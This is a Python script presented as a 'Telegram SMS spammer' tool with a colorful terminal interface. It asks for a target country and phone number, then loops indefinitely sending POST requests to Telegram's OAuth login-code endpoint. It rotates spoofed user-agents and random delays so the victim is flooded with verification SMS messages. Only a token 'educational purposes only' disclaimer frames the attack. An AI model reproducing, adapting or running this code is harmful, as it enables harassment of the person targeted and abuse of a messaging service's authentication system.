"""
🎯 TELEGRAM SMS SPAMMER TOOL
🔥 BY AHMEDALHRRANI
🚀 ENHANCED VERSION WITH EXTREME UI & COLORS
"""

import os
import sys
import time
import random
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# 🔧 AUTO INSTALL REQUIRED PACKAGES
REQUIRED_PACKAGES = ["rich", "requests", "user_agent"]
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.text import Text
    from rich.columns import Columns
    from rich.box import DOUBLE, ROUNDED, HEAVY
    from rich.style import Style
    from rich.layout import Layout
    from rich.live import Live
    from rich.align import Align
    from rich.rule import Rule
    from pyfiglet import Figlet
    import requests
    from user_agent import generate_user_agent
except ImportError:
    print(f"🔧 Installing required packages: {REQUIRED_PACKAGES}")
    for package in REQUIRED_PACKAGES:
        os.system(f"pip install {package} >nul 2>&1" if os.name == 'nt' else f"pip install {package} 2>/dev/null")
    print("✅ Packages installed! Please restart the script.")
    sys.exit(1)

# 🔥 IMPORT AFTER INSTALLATION
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich.columns import Columns
from rich.box import DOUBLE, ROUNDED, HEAVY
from rich.style import Style
from rich.align import Align
from rich.rule import Rule
from pyfiglet import Figlet
import requests
from user_agent import generate_user_agent

console = Console()

# 🌈 RAINBOW COLOR PALETTE
class Rainbow:
    """Rainbow color generator for animated effects"""
    COLORS = [
        "#FF0000", "#FF3300", "#FF6600", "#FF9900", "#FFCC00",
        "#FFFF00", "#CCFF00", "#99FF00", "#66FF00", "#33FF00",
        "#00FF00", "#00FF33", "#00FF66", "#00FF99", "#00FFCC",
        "#00FFFF", "#00CCFF", "#0099FF", "#0066FF", "#0033FF",
        "#0000FF", "#3300FF", "#6600FF", "#9900FF", "#CC00FF",
        "#FF00FF", "#FF00CC", "#FF0099", "#FF0066", "#FF0033"
    ]
    
    @staticmethod
    def get_color(index: int) -> str:
        return Rainbow.COLORS[index % len(Rainbow.COLORS)]

# 🎨 EXTENDED COLOR PALETTE
class Colors:
    """Extended color palette with vibrant colors"""
    # 🔴 Reds
    FIRE_RED = "bold #FF3300"
    DEEP_RED = "bold #CC0000"
    NEON_RED = "bold #FF0066"
    
    # 🟢 Greens
    NEON_GREEN = "bold #00FF00"
    EMERALD = "bold #00CC66"
    LIME = "bold #99FF00"
    
    # 🔵 Blues
    ELECTRIC_BLUE = "bold #0066FF"
    CYAN = "bold #00FFFF"
    ROYAL_BLUE = "bold #3366FF"
    
    # 🟡 Yellows
    GOLD = "bold #FFCC00"
    SUN_YELLOW = "bold #FFFF00"
    AMBER = "bold #FF9900"
    
    # 🟣 Purples
    PURPLE = "bold #9900FF"
    MAGENTA = "bold #FF00FF"
    LAVENDER = "bold #CC99FF"
    
    # ⚪ Others
    WHITE = "bold #FFFFFF"
    SILVER = "bold #CCCCCC"
    ORANGE = "bold #FF6600"
    PINK = "bold #FF66CC"
    
    # 🔥 Gradient Colors
    GRADIENT_1 = "bold linear-gradient(45deg, #FF0000, #FF9900)"
    GRADIENT_2 = "bold linear-gradient(45deg, #00FF00, #00CCFF)"
    GRADIENT_3 = "bold linear-gradient(45deg, #9900FF, #FF00FF)"

# 🌍 COUNTRIES DATABASE
COUNTRIES: Dict[str, str] = {
    "Afghanistan-🇦🇫": "+93",
    "Albania-🇦🇱": "+355",
    "Algeria-🇩🇿": "+213",
    "Andorra-🇦🇩": "+376",
    "Angola-🇦🇴": "+244",
    "Antigua and Barbuda-🇦🇬": "+1",
    "Argentina-🇦🇷": "+54",
    "Armenia-🇦🇲": "+374",
    "Australia-🇦🇺": "+61",
    "Austria-🇦🇹": "+43",
    "Azerbaijan-🇦🇿": "+994",

    "Bahamas-🇧🇸": "+1",
    "Bahrain-🇧🇭": "+973",
    "Bangladesh-🇧🇩": "+880",
    "Barbados-🇧🇧": "+1",
    "Belarus-🇧🇾": "+375",
    "Belgium-🇧🇪": "+32",
    "Belize-🇧🇿": "+501",
    "Benin-🇧🇯": "+229",
    "Bhutan-🇧🇹": "+975",
    "Bolivia-🇧🇴": "+591",
    "Bosnia and Herzegovina-🇧🇦": "+387",
    "Botswana-🇧🇼": "+267",
    "Brazil-🇧🇷": "+55",
    "Brunei-🇧🇳": "+673",
    "Bulgaria-🇧🇬": "+359",
    "Burkina Faso-🇧🇫": "+226",
    "Burundi-🇧🇮": "+257",

    "Cambodia-🇰🇭": "+855",
    "Cameroon-🇨🇲": "+237",
    "Canada-🇨🇦": "+1",
    "Cape Verde-🇨🇻": "+238",
    "Central African Republic-🇨🇫": "+236",
    "Chad-🇹🇩": "+235",
    "Chile-🇨🇱": "+56",
    "China-🇨🇳": "+86",
    "Colombia-🇨🇴": "+57",
    "Comoros-🇰🇲": "+269",
    "Congo-🇨🇬": "+242",
    "Costa Rica-🇨🇷": "+506",
    "Croatia-🇭🇷": "+385",
    "Cuba-🇨🇺": "+53",
    "Cyprus-🇨🇾": "+357",
    "Czech Republic-🇨🇿": "+420",

    "Denmark-🇩🇰": "+45",
    "Djibouti-🇩🇯": "+253",
    "Dominica-🇩🇲": "+1",
    "Dominican Republic-🇩🇴": "+1",

    "Ecuador-🇪🇨": "+593",
    "Egypt-🇪🇬": "+20",
    "El Salvador-🇸🇻": "+503",
    "Equatorial Guinea-🇬🇶": "+240",
    "Eritrea-🇪🇷": "+291",
    "Estonia-🇪🇪": "+372",
    "Eswatini-🇸🇿": "+268",
    "Ethiopia-🇪🇹": "+251",

    "Fiji-🇫🇯": "+679",
    "Finland-🇫🇮": "+358",
    "France-🇫🇷": "+33",

    "Gabon-🇬🇦": "+241",
    "Gambia-🇬🇲": "+220",
    "Georgia-🇬🇪": "+995",
    "Germany-🇩🇪": "+49",
    "Ghana-🇬🇭": "+233",
    "Greece-🇬🇷": "+30",
    "Grenada-🇬🇩": "+1",
    "Guatemala-🇬🇹": "+502",
    "Guinea-🇬🇳": "+224",
    "Guinea-Bissau-🇬🇼": "+245",
    "Guyana-🇬🇾": "+592",

    "Haiti-🇭🇹": "+509",
    "Honduras-🇭🇳": "+504",
    "Hungary-🇭🇺": "+36",

    "Iceland-🇮🇸": "+354",
    "India-🇮🇳": "+91",
    "Indonesia-🇮🇩": "+62",
    "Iran-🇮🇷": "+98",
    "Iraq-🇮🇶": "+964",
    "Ireland-🇮🇪": "+353",
    "Italy-🇮🇹": "+39",

    "Jamaica-🇯🇲": "+1",
    "Japan-🇯🇵": "+81",
    "Jordan-🇯🇴": "+962",

    "Kazakhstan-🇰🇿": "+7",
    "Kenya-🇰🇪": "+254",
    "Kuwait-🇰🇼": "+965",
    "Kyrgyzstan-🇰🇬": "+996",

    "Laos-🇱🇦": "+856",
    "Latvia-🇱🇻": "+371",
    "Lebanon-🇱🇧": "+961",
    "Lesotho-🇱🇸": "+266",
    "Liberia-🇱🇷": "+231",
    "Libya-🇱🇾": "+218",
    "Liechtenstein-🇱🇮": "+423",
    "Lithuania-🇱🇹": "+370",
    "Luxembourg-🇱🇺": "+352",

    "Malaysia-🇲🇾": "+60",
    "Maldives-🇲🇻": "+960",
    "Mali-🇲🇱": "+223",
    "Malta-🇲🇹": "+356",
    "Mexico-🇲🇽": "+52",
    "Moldova-🇲🇩": "+373",
    "Monaco-🇲🇨": "+377",
    "Mongolia-🇲🇳": "+976",
    "Morocco-🇲🇦": "+212",
    "Mozambique-🇲🇿": "+258",

    "Namibia-🇳🇦": "+264",
    "Nepal-🇳🇵": "+977",
    "Netherlands-🇳🇱": "+31",
    "New Zealand-🇳🇿": "+64",
    "Nicaragua-🇳🇮": "+505",
    "Niger-🇳🇪": "+227",
    "Nigeria-🇳🇬": "+234",
    "North Korea-🇰🇵": "+850",
    "Norway-🇳🇴": "+47",

    "Oman-🇴🇲": "+968",

    "Pakistan-🇵🇰": "+92",
    "Panama-🇵🇦": "+507",
    "Paraguay-🇵🇾": "+595",
    "Peru-🇵🇪": "+51",
    "Philippines-🇵🇭": "+63",
    "Poland-🇵🇱": "+48",
    "Portugal-🇵🇹": "+351",

    "Qatar-🇶🇦": "+974",

    "Romania-🇷🇴": "+40",
    "Russia-🇷🇺": "+7",
    "Rwanda-🇷🇼": "+250",

    "Saudi Arabia-🇸🇦": "+966",
    "Senegal-🇸🇳": "+221",
    "Serbia-🇷🇸": "+381",
    "Singapore-🇸🇬": "+65",
    "Slovakia-🇸🇰": "+421",
    "Slovenia-🇸🇮": "+386",
    "Somalia-🇸🇴": "+252",
    "South Africa-🇿🇦": "+27",
    "South Korea-🇰🇷": "+82",
    "Spain-🇪🇸": "+34",
    "Sudan-🇸🇩": "+249",
    "Sweden-🇸🇪": "+46",
    "Switzerland-🇨🇭": "+41",
    "Syria-🇸🇾": "+963",

    "Thailand-🇹🇭": "+66",
    "Tunisia-🇹🇳": "+216",
    "Turkey-🇹🇷": "+90",

    "UAE-🇦🇪": "+971",
    "UK-🇬🇧": "+44",
    "Ukraine-🇺🇦": "+380",
    "USA-🇺🇸": "+1",
    "Uruguay-🇺🇾": "+598",
    "Uzbekistan-🇺🇿": "+998",

    "Venezuela-🇻🇪": "+58",
    "Vietnam-🇻🇳": "+84",

    "Yemen-🇾🇪": "+967",
    "Zambia-🇿🇲": "+260",
    "Zimbabwe-🇿🇼": "+263"
}

# 🎭 ASCII ART & BANNERS
def create_ascii_art() -> str:
    """Create dynamic ASCII art banner"""
    try:
        f = Figlet(font='slant')
        return f.renderText('SMS SPAMMER')
    except:
        return """
        ╔═══╗╔═══╗╔═══╗   ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
        ║╔═╗║║╔═╗║║╔═╗║   ║╔══╝║╔══╝║╔═╗║║╔═╗║║╔══╝║╔═╗║
        ║╚═╝║║╚═╝║║╚═╝║   ║╚══╗║╚══╗║╚═╝║║╚═╝║║╚══╗║╚═╝║
        ║╔══╝║╔╗╔╝║╔╗╔╝   ║╔══╝║╔══╝║╔══╝║╔╗╔╝║╔══╝║╔╗╔╝
        ║║   ║║║╚╗║║║╚╗   ║╚══╗║╚══╗║║   ║║║╚╗║╚══╗║║║╚╗
        ╚╝   ╚╝╚═╝╚╝╚═╝   ╚═══╝╚═══╝╚╝   ╚╝╚═╝╚═══╝╚╝╚═╝
        """

def show_animated_banner():
    """Display animated banner with rainbow colors"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = create_ascii_art()
    lines = banner.split('\n')
    
    console.print("\n" * 2)
    
    # Animate each line with different colors
    for i, line in enumerate(lines):
        if line.strip():
            color = Rainbow.get_color(i * 3)
            console.print(Align.center(f"[{color}]{line}[/]"), style=Style(bold=True))
    
    # Subtitle
    subtitle = "🔥 ULTIMATE TELEGRAM SMS SPAMMER TOOL 🔥"
    console.print(Align.center(f"[{Colors.GRADIENT_1}]{subtitle}[/]"), style=Style(bold=True))
    
    # Author
    author = "✨ CREATED BY: AHMEDALHRRANI ✨"
    console.print(Align.center(f"[{Colors.GRADIENT_2}]{author}[/]"), style=Style(bold=True))
    
    console.print("\n")
    console.print(Rule(style=Colors.PURPLE))
    console.print("\n")

# 📊 BEAUTIFUL COUNTRIES TABLE
def show_countries_table() -> int:
    """Display beautiful countries table with gradient colors"""
    table = Table(
        title="[bold #FF00FF]🌍 SELECT COUNTRY 🌍[/]",
        show_header=True,
        header_style=Style(color="#00FFFF", bold=True, blink=True),
        border_style=Style(color="#FF9900"),
        box=HEAVY,
        style=Style(color="#CCCCCC"),
        title_style=Style(color="#FF00FF", bold=True, underline=True)
    )
    
    # Colorful columns
    table.add_column("🔢", justify="center", style="bold #FFFF00", width=6)
    table.add_column("🏳️ COUNTRY", justify="center", style="bold #00FF00", width=25)
    table.add_column("📞 CODE", justify="center", style="bold #00FFFF", width=15)
    table.add_column("✨ STATUS", justify="center", style="bold #FF00FF", width=12)
    
    for idx, (country, code) in enumerate(COUNTRIES.items(), 1):
        # Alternate row colors
        if idx % 2 == 0:
            row_style = Style(color="#99CCFF")
        else:
            row_style = Style(color="#FFCC99")
        
        # Add emoji based on index
        emoji = "⭐" if idx <= 5 else "🔥" if idx <= 10 else "⚡" if idx <= 15 else "🎯"
        
        table.add_row(
            f"[bold #FF6600]{idx}[/]",
            f"[bold #00CC66]{country}[/]",
            f"[bold #0066FF]{code}[/]",
            f"[bold #FF00FF]{emoji} ACTIVE[/]",
            style=row_style
        )
    
    # Display table with animation effect
    console.print("\n")
    with console.status("[bold cyan]Loading countries database...[/]", spinner="dots"):
        time.sleep(0.5)
    
    console.print(Align.center(table))
    console.print("\n")
    
    # Get user choice with validation
    while True:
        try:
            choice_text = Text("🎯 ENTER COUNTRY NUMBER: ", style=Style(color="#00FF00", bold=True))
            choice = console.input(choice_text)
            choice_num = int(choice)
            
            if 1 <= choice_num <= len(COUNTRIES):
                # Animate selection
                selected_country = list(COUNTRIES.keys())[choice_num - 1]
                selected_code = list(COUNTRIES.values())[choice_num - 1]
                
                console.print(f"\n[{Colors.NEON_GREEN}]✅ SELECTED: [/][{Colors.GOLD}]{selected_country} {selected_code}[/]")
                time.sleep(0.3)
                
                return choice_num
            else:
                error_text = Text(f"❌ INVALID! CHOOSE 1-{len(COUNTRIES)}", style=Style(color="#FF0000", bold=True))
                console.print(error_text)
                
        except ValueError:
            error_text = Text("❌ ENTER VALID NUMBER!", style=Style(color="#FF3300", bold=True))
            console.print(error_text)

# 📱 PHONE NUMBER INPUT WITH VALIDATION
def get_phone_number(country_name: str, country_code: str) -> str:
    """Get phone number with beautiful input interface"""
    # Show country info in a panel
    country_panel = Panel.fit(
        f"[{Colors.ELECTRIC_BLUE}]🌍 COUNTRY: [/][{Colors.NEON_GREEN}]{country_name}[/]\n"
        f"[{Colors.ELECTRIC_BLUE}]📞 CODE: [/][{Colors.GOLD}]{country_code}[/]",
        border_style=Colors.PURPLE,
        title="[bold #FF00FF]SELECTED COUNTRY[/]",
        padding=(1, 2)
    )
    
    console.print("\n")
    console.print(Align.center(country_panel))
    console.print("\n")
    
    # Phone input with validation
    while True:
        phone_prompt = Text("\n📱 ENTER PHONE NUMBER (Without Country Code): ", 
                          style=Style(color="#00FFFF", bold=True))
        phone = console.input(phone_prompt).strip()
        
        if not phone:
            console.print(f"[{Colors.NEON_RED}]❌ NUMBER CANNOT BE EMPTY![/]")
            continue
            
        if not phone.isdigit():
            console.print(f"[{Colors.NEON_RED}]❌ MUST CONTAIN ONLY DIGITS![/]")
            continue
            
        # Length validation
        min_lengths = {'+964': 10, '+20': 10, '+966': 9, '+971': 9}
        expected = min_lengths.get(country_code, 8)
        
        if len(phone) < expected:
            console.print(f"[{Colors.AMBER}]⚠️  NUMBER MAY BE TOO SHORT FOR {country_name}[/]")
            confirm = console.input(f"[{Colors.SUN_YELLOW}]❓ CONTINUE ANYWAY? (Y/N): [/]").strip().lower()
            if confirm not in ['y', 'yes', '']:
                continue
        
        full_number = f"{country_code}{phone}"
        
        # Display formatted number
        formatted_panel = Panel.fit(
            f"[{Colors.WHITE}]📲 FULL NUMBER: [/][{Colors.NEON_GREEN}]{full_number}[/]\n"
            f"[{Colors.WHITE}]🔢 DIGITS: [/][{Colors.CYAN}]{len(phone)}[/]",
            border_style=Colors.EMERALD,
            title="[bold #00FF00]NUMBER CONFIRMED[/]"
        )
        
        console.print("\n")
        console.print(Align.center(formatted_panel))
        
        return full_number

# 🎭 USER-AGENT GENERATORS WITH COLORS
def generate_dalvik_agent() -> str:
    """Generate colorful Dalvik user-agent"""
    versions = ["1.6.0", "2.1.0", "2.1.2", "2.2.0", "3.0.0"]
    android_versions = ["7.0", "8.1", "9.0", "10.0", "11.0", "12.0", "13.0"]
    devices = [
        "SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", 
        "Pixel 6", "Pixel 7", "OnePlus 7T", "OnePlus 9", "Xiaomi Mi 11",
        "HUAWEI P30", "HUAWEI P40", "Samsung Galaxy S21", "S22 Ultra"
    ]
    build_ids = [
        "QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", 
        "NRD90M", "QKQ1.190910.002", "LMY47V", "TQ2A.230505.002"
    ]
    
    version = random.choice(versions)
    android = random.choice(android_versions)
    device = random.choice(devices)
    build = random.choice(build_ids)
    
    return f"Dalvik/{version} (Linux; U; Android {android}; {device} Build/{build})"

def generate_browser_agent() -> str:
    """Generate colorful browser user-agent"""
    browsers = {
        'chrome': ('Chrome', '🟡'),
        'firefox': ('Firefox', '🦊'),
        'edge': ('Edge', '🔵'),
        'safari': ('Safari', '🔘'),
        'opera': ('Opera', '🔴'),
        'brave': ('Brave', '🦁'),
        'kiwi': ('Kiwi', '🥝')
    }
    
    browser_name, emoji = random.choice(list(browsers.values()))
    android_versions = ["9", "10", "11", "12", "13", "14"]
    devices = [
        "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7",
        "Samsung Galaxy S21", "S22", "S23",
        "OnePlus 9", "10 Pro", "11",
        "Xiaomi Mi 11", "12", "13",
        "Huawei P40", "P50", "P60"
    ]
    
    chrome_version = random.randint(90, 120)
    webkit_version = random.randint(537, 545)
    android_version = random.choice(android_versions)
    device = random.choice(devices)
    
    return f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/{webkit_version}.36 (KHTML, like Gecko) {browser_name}/{chrome_version}.0.0.0 Mobile Safari/{webkit_version}.36 {emoji}"

def generate_ios_agent() -> str:
    """Generate colorful iOS user-agent"""
    ios_versions = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0", "17.2"]
    devices = [
        "iPhone12,1", "iPhone12,3", "iPhone13,1", "iPhone13,2",
        "iPhone14,2", "iPhone14,5", "iPhone15,2", "iPhone15,3",
        "iPad8,1", "iPad8,9", "iPad11,6", "iPad13,1"
    ]
    
    ios = random.choice(ios_versions)
    device = random.choice(devices)
    webkit_version = random.randint(605, 615)
    safari_version = random.randint(14, 17)
    
    return f"Mozilla/5.0 ({device}; CPU OS {ios.replace('.', '_')} like Mac OS X) AppleWebKit/{webkit_version}.1.15 (KHTML, like Gecko) Version/{safari_version}.0 Mobile/15E148 Safari/{webkit_version}.1 📱"

# ⚡ SPAM ATTACK ENGINE
def send_spam_request(phone_number: str, attempt: int) -> Tuple[bool, str]:
    """Send single SMS request with colorful response"""
    # Generate random user-agent
    user_agents = [
        generate_dalvik_agent(),
        generate_browser_agent(),
        generate_ios_agent(),
        generate_user_agent() + " 🎭"
    ]
    
    agent = random.choice(user_agents)
    
    # Colorful headers
    headers = {
        'User-Agent': agent,
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/x-www-form-urlencoded",
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
        'sec-ch-ua-platform': '"Android"',
        'x-requested-with': "XMLHttpRequest",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://oauth.telegram.org",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
        'accept-language': "en-US,en;q=0.9,ar;q=0.8",
        'priority': "u=1, i",
    }
    
    payload = f"phone={phone_number}"
    
    try:
        # Send request with timeout
        response = requests.post(
            "https://oauth.telegram.org/auth/request",
            params={
                'bot_id': "5444323279",
                'origin': "https://fragment.com",
                'request_access': "write",
            },
            data=payload,
            headers=headers,
            timeout=8
        )
        
        if response.status_code == 200:
            return True, "✅ SUCCESS"
        else:
            return False, f"❌ ERROR {response.status_code}"
            
    except requests.Timeout:
        return False, "⏰ TIMEOUT"
    except requests.ConnectionError:
        return False, "🔌 CONNECTION ERROR"
    except Exception as e:
        return False, f"⚠️  {str(e)[:30]}"

def start_spam_attack(phone_number: str):
    """Start the main spam attack with beautiful interface"""
    # Attack initiation panel
    attack_panel = Panel.fit(
        f"[{Colors.FIRE_RED}]⚡ TARGET: [/][{Colors.WHITE}]{phone_number}[/]\n"
        f"[{Colors.FIRE_RED}]🎯 MODE: [/][{Colors.NEON_GREEN}]ULTRA SPAM ATTACK[/]\n"
        f"[{Colors.FIRE_RED}]🔥 ENGINE: [/][{Colors.CYAN}]TURBO MODE ACTIVATED[/]",
        border_style=Colors.NEON_RED,
        title="[bold #FF0000]🚀 ATTACK INITIATED 🚀[/]",
        padding=(1, 4)
    )
    
    console.print("\n")
    console.print(Align.center(attack_panel))
    
    # Countdown animation
    console.print(f"\n[{Colors.GOLD}]🚀 LAUNCHING IN: [/]", end="")
    for i in range(3, 0, -1):
        console.print(f"[{Colors.NEON_RED}] {i}...[/]", end="", style=Style(blink=True))
        time.sleep(0.7)
    console.print(f"[{Colors.NEON_GREEN}] GO! 🚀[/]\n")
    
    # Statistics
    successful = 0
    failed = 0
    start_time = time.time()
    
    # Progress bar setup
    with Progress(
        SpinnerColumn(spinner_name="dots12", style=Colors.PURPLE),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=50, complete_style=Colors.NEON_GREEN, finished_style=Colors.EMERALD),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console,
        expand=True
    ) as progress:
        
        task = progress.add_task(
            f"[{Colors.CYAN}]⚡ ATTACKING...[/]",
            total=100,
            start=False
        )
        
        try:
            while True:
                attempt_num = successful + failed + 1
                
                # Update progress
                progress_percent = min(95, (attempt_num % 100))
                progress.update(task, completed=progress_percent)
                
                # Update description with rainbow colors
                color = Rainbow.get_color(attempt_num)
                progress.update(task, 
                    description=f"[{color}]📡 ATTEMPT #{attempt_num:03d} | ✅ {successful:03d} | ❌ {failed:03d}[/]")
                
                # Send request
                success, message = send_spam_request(phone_number, attempt_num)
                
                # Display result with emoji
                if success:
                    successful += 1
                    result_color = Colors.NEON_GREEN
                    emoji = random.choice(["✅", "🎯", "⚡", "🔥", "✨"])
                else:
                    failed += 1
                    result_color = Colors.NEON_RED
                    emoji = random.choice(["❌", "💥", "⚠️", "🚫", "🔴"])
                
                # Show result
                result_text = f"[{result_color}]{emoji} {message}[/]"
                console.print(result_text, end="\r" if attempt_num % 5 != 0 else "\n")
                
                # Random delay
                delay = random.uniform(0.3, 1.5)
                time.sleep(delay)
                
        except KeyboardInterrupt:
            pass
    
    # Calculate statistics
    end_time = time.time()
    duration = end_time - start_time
    total = successful + failed
    success_rate = (successful / total * 100) if total > 0 else 0
    speed = total / duration if duration > 0 else 0
    
    # Show final report
    show_attack_report(successful, failed, duration, success_rate, speed)

def show_attack_report(successful: int, failed: int, duration: float, rate: float, speed: float):
    """Display beautiful attack report"""
    # Create gradient-colored report
    report_content = f"""
    [{Colors.GRADIENT_1}]╔══════════════════════════════════════════╗[/]
    [{Colors.GRADIENT_1}]║          🎉 ATTACK COMPLETED 🎉          ║[/]
    [{Colors.GRADIENT_2}]╠══════════════════════════════════════════╣[/]
    [{Colors.CYAN}]║  ✅ SUCCESSFUL: [/][{Colors.NEON_GREEN}]{successful:6d} messages    ║[/]
    [{Colors.CYAN}]║  ❌ FAILED:     [/][{Colors.NEON_RED}]{failed:6d} messages    ║[/]
    [{Colors.CYAN}]║  📊 TOTAL:      [/][{Colors.GOLD}]{successful + failed:6d} messages    ║[/]
    [{Colors.GRADIENT_3}]╠══════════════════════════════════════════╣[/]
    [{Colors.MAGENTA}]║  🎯 SUCCESS RATE:  [/][{Colors.EMERALD}]{rate:6.1f}%            ║[/]
    [{Colors.MAGENTA}]║  ⏱️  DURATION:      [/][{Colors.ROYAL_BLUE}]{duration:6.1f} sec        ║[/]
    [{Colors.MAGENTA}]║  ⚡ SPEED:          [/][{Colors.PINK}]{speed:6.1f} msg/sec      ║[/]
    [{Colors.GRADIENT_1}]╚══════════════════════════════════════════╝[/]
    """
    
    console.print("\n" * 2)
    console.print(Align.center(report_content))
    
    # Performance rating
    rating = "🔥 EXCELLENT" if rate > 90 else "✅ GOOD" if rate > 70 else "⚠️  AVERAGE" if rate > 50 else "❌ POOR"
    rating_color = Colors.NEON_GREEN if rate > 90 else Colors.GOLD if rate > 70 else Colors.AMBER if rate > 50 else Colors.NEON_RED
    
    rating_panel = Panel.fit(
        f"[{Colors.WHITE}]🏆 PERFORMANCE RATING: [/][{rating_color}]{rating}[/]\n"
        f"[{Colors.WHITE}]⭐ SUCCESS SCORE: [/][{Colors.GOLD}]{rate:.0f}/100[/]",
        border_style=Colors.PURPLE,
        title="[bold #FF00FF]FINAL SCORE[/]"
    )
    
    console.print("\n")
    console.print(Align.center(rating_panel))

# 🎮 MAIN GAME-LIKE INTERFACE
def main():
    """Main function with game-like interface"""
    try:
        # Clear screen and show banner
        show_animated_banner()
        
        # Show warning
        warning_panel = Panel.fit(
            f"[{Colors.NEON_RED}]⚠️  WARNING: FOR EDUCATIONAL PURPOSES ONLY! ⚠️[/]\n"
            f"[{Colors.AMBER}]🔒 USE RESPONSIBLY | ⚖️ RESPECT PRIVACY LAWS[/]",
            border_style=Colors.NEON_RED,
            title="[blink bold #FF0000]DISCLAIMER[/]"
        )
        
        console.print(Align.center(warning_panel))
        console.print("\n")
        
        # Accept terms
        terms = console.input(f"[{Colors.GOLD}]❔ ACCEPT TERMS? (Y/N): [/]").strip().lower()
        if terms not in ['y', 'yes', '']:
            console.print(f"[{Colors.NEON_GREEN}]👋 GOODBYE![/]")
            return
        
        # Step 1: Select country
        console.print(f"\n[{Colors.ELECTRIC_BLUE}]📋 STEP 1: SELECT TARGET COUNTRY[/]")
        country_index = show_countries_table() - 1
        country_list = list(COUNTRIES.items())
        country_name, country_code = country_list[country_index]
        
        # Step 2: Enter phone number
        console.print(f"\n[{Colors.ELECTRIC_BLUE}]📱 STEP 2: ENTER TARGET NUMBER[/]")
        phone_number = get_phone_number(country_name, country_code)
        
        # Step 3: Final confirmation
        confirm_panel = Panel.fit(
            f"[{Colors.FIRE_RED}]🎯 READY TO LAUNCH ATTACK? 🎯[/]\n\n"
            f"[{Colors.WHITE}]TARGET: [/][{Colors.NEON_GREEN}]{phone_number}[/]\n"
            f"[{Colors.WHITE}]COUNTRY: [/][{Colors.GOLD}]{country_name}[/]\n"
            f"[{Colors.WHITE}]MODE: [/][{Colors.CYAN}]EXTREME SPAM[/]",
            border_style=Colors.NEON_RED,
            title="[bold #FF0000]FINAL CONFIRMATION[/]",
            padding=(2, 4)
        )
        
        console.print("\n")
        console.print(Align.center(confirm_panel))
        
        confirm = console.input(f"\n[{Colors.NEON_RED}]🚀 LAUNCH ATTACK? (Y/N): [/]").strip().lower()
        if confirm not in ['y', 'yes', '']:
            console.print(f"[{Colors.NEON_GREEN}]✅ ATTACK CANCELLED![/]")
            return
        
        # Start attack
        start_spam_attack(phone_number)
        
        # Restart option
        restart_panel = Panel.fit(
            f"[{Colors.PURPLE}]🔄 WANT TO RESTART? 🔄[/]",
            border_style=Colors.MAGENTA,
            padding=(1, 20)
        )
        
        console.print("\n")
        console.print(Align.center(restart_panel))
        
        restart = console.input(f"[{Colors.CYAN}]🔄 RESTART? (Y/N): [/]").strip().lower()
        if restart in ['y', 'yes', '']:
            console.print(f"[{Colors.NEON_GREEN}]🔄 RESTARTING...[/]")
            time.sleep(1)
            main()
        else:
            goodbye = Text("\n✨ THANK YOU FOR USING SMS SPAMMER! ✨\n👋 GOODBYE! SEE YOU NEXT TIME! 👋\n", 
                          style=Style(color="#00FFFF", bold=True))
            console.print(Align.center(goodbye))
            time.sleep(2)
            
    except KeyboardInterrupt:
        console.print(f"\n\n[{Colors.GOLD}]⚠️  PROGRAM INTERRUPTED BY USER[/]")
        console.print(f"[{Colors.CYAN}]👋 GOODBYE![/]")
    except Exception as e:
        console.print(f"\n[{Colors.NEON_RED}]💥 CRITICAL ERROR: {str(e)}[/]")
        console.print(f"[{Colors.AMBER}]🔄 PLEASE RESTART THE APPLICATION[/]")

# 🚀 ENTRY POINT
if __name__ == "__main__":
    try:
        # Check for updates
        console.print(f"[{Colors.CYAN}]🔍 CHECKING FOR UPDATES...[/]")
        time.sleep(0.5)
        
        # Run main function
        main()
        
    except Exception as e:
        console.print(f"\n[{Colors.NEON_RED}]💀 FATAL ERROR: {str(e)}[/]")
        console.print(f"[{Colors.AMBER}]📧 CONTACT DEVELOPER FOR SUPPORT[/]")
        console.input(f"[{Colors.WHITE}]PRESS ENTER TO EXIT...[/]")